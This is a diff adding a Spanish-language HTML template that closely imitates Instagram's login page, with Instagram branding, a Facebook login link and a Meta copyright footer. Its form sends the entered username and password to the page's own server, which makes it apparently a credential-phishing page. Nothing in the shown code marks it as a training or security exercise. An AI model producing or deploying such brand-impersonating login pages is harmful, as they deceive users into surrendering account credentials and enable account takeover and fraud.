@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
+  <!-- Font Awesome para el ícono de Facebook -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+<body>
+  <main class="container">
+    <div class="login-box">
+      <h1 class="logo">Instagram</h1>
+      {% if error %}
+        <p class="error">{{ error }}</p>
+      {% endif %}
+      <form method="POST">
+        <input type="text" name="username" placeholder="Número de teléfono, nombre de perfil o correo electrónico" required>
+        <input type="password" name="password" placeholder="Contraseña" required>
+        <button type="submit" class="btn-login">Acceso</button>
+      </form>
+
+      <div class="divider"><span>o</span></div>
+
+      <!-- Facebook login -->
+      <div style="margin-top: 20px; text-align: center;">
+        <a href="#" style="color: #1877f2; font-weight: bold; text-decoration: none; display: inline-flex; align-items: center; font-size: 14px;">
+          <i class="fab fa-facebook-square" style="font-size: 22px; margin-right: 8px;"></i>
+          Conectarse con Facebook
+        </a>
+      </div>
+
+      <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+
+      <p class="report">
+        También puedes <a href="#">denunciar contenido que consideres ilegal</a> sin iniciar sesión.
+      </p>
+    </div>
+
+    <div class="signup-box">
+      <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
+    </div>
+
+    <!-- Footer similar al de Instagram -->
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">Acerca de</a>
+        <a href="#">Blog</a>
+        <a href="#">Empleos</a>
+        <a href="#">Ayuda</a>
+        <a href="#">API</a>
+        <a href="#">Confidencialidad</a>
+        <a href="#">Configuración de cookies</a>
+        <a href="#">Términos</a>
+        <a href="#">Lugares</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Meta IA</a>
+        <a href="#">Artículos de Meta AI</a>
+        <a href="#">Trapos</a>
+        <a href="#">Importación de contactos y no usuarios</a>
+        <a href="#">Meta verificado</a>
+      </div>
+      <div class="footer-bottom">
+        <span>Francés ▼</span>
+        <span>© 2025 Instagram de Meta</span>
+      </div>
+    </footer>
+  </main>
+</body>
+</html>
